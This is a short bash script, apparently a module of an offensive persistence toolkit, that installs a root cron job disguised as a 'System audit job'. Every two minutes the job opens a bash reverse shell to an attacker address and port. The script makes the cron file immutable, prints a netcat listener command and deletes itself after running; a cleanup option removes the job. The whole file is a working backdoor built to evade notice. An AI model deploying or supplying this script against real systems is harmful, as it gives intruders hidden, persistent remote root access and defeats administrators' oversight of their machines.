#!/usr/bin/env bash
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

ATTACKER_IP="${ATTACKER_IP:-172.31.40.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"
CRON_FILE="/etc/cron.d/sysaudit"

case "${1:-}" in
  deploy)
    cat > "$CRON_FILE" <<CRON_EOF
# System audit job
*/2 * * * * root bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1 2>/dev/null || true
CRON_EOF
    chmod 644 "$CRON_FILE"
    chattr +i "$CRON_FILE" 2>/dev/null || true
    echo "[+] 05_cron_shell: ${CRON_FILE} (immutable) → ${ATTACKER_IP}:${ATTACKER_PORT} every 2 min"
    echo "[+]   Listener: nc -lvnp ${ATTACKER_PORT}"
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;
  cleanup)
    chattr -i "$CRON_FILE" 2>/dev/null || true
    rm -f "$CRON_FILE"
    echo "[-] 05_cron_shell: removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
